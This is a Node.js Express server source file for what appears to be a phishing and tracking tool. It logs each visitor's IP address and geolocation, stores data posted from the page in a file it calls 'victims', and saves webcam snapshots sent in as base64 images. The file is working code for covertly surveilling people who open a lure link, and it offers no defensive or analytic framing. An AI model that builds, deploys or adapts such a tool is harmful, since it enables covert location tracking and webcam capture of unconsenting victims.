const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");
const base64ToImage = require("base64-to-image");
const axios = require("axios");
const config = require("./app").config;

const app = express();
app.set("view engine", "ejs");
app.use(express.static("public"));
app.set("trust proxy", true); // Trust proxy headers for accurate IP

// Body parser
app.use(bodyParser.json({ limit: "20mb", type: "application/json" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "20mb", type: "application/x-www-form-urlencoded" }));

// Utility function to get real IP
function getClientIP(req) {
    let ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection?.remoteAddress || req.ip;
    // Clean IPv6 localhost or private IPs
    if (
        ip === "::1" ||
        ip === "127.0.0.1" ||
        ip.startsWith("192.168.") ||
        ip.startsWith("10.") ||
        ip.startsWith("172.")
    ) {
        return ""; // Let GeoIP service detect it
    }
    return ip;
}

// GET /
app.get("/", async (req, res) => {
    const ip = getClientIP(req);
    const timestamp = new Date().toISOString().slice(0, 19).replace("T", ":");
    let location = "GeoIP not available";

    try {
        // Use ipinfo.io (more reliable, free up to 50k req/month)
        const token = "YOUR_TOKEN_HERE"; // Replace with your token from https://ipinfo.io/signup
        const response = await axios.get(`https://ipinfo.io/${ip}?token=${token}`);
        const data = response.data;

        if (data.city && data.region && data.country) {
            location = `${data.city}, ${data.region}, ${data.country}`;
        }
        console.log("GeoIP Lookup:", location);
    } catch (error) {
        console.error("GeoIP request failed:", error.message);
        location = "GeoIP request error";
    }

    // Log visit
    try {
        fs.appendFileSync(
            "./views/log.txt",
            `Visit Form: ${ip || "Unknown IP"} | At: ${timestamp} | Location: ${location}\n\n`
        );
    } catch (err) {
        console.error("Failed to write to log:", err.message);
    }

    res.render("index", {
        ip: ip || "Localhost",
        time: timestamp,
        redirect: config.redirectURL,
        camera: config.camera,
        cams: config.camsnaps,
        location,
    });
});

// GET /victims
app.get("/victims", (req, res) => {
    res.render("victims");
});

// POST /
app.post("/", (req, res) => {
    try {
        const decodedData = decodeURIComponent(req.body.data || "");
        fs.appendFileSync("./views/victims.ejs", `${decodedData}\n\n`);
        console.log("Victim data saved.");
        res.send("Done");
    } catch (err) {
        console.error("Failed to save victim data:", err.message);
        res.status(500).send("Error saving data");
    }
});

// POST /camsnap
app.post("/camsnap", (req, res) => {
    try {
        const imagePath = "./public/images/";
        const { imageType, fileName } = base64ToImage(
            decodeURIComponent(req.body.img || ""),
            imagePath,
            { type: "png" }
        );
        res.send(fileName);
    } catch (err) {
        console.error("Image save error:", err.message);
        res.status(500).send("Failed to save image");
    }
});

// Start server
app.listen(5000, () => {
    console.log("✅ Server running on http://localhost:5000");
});

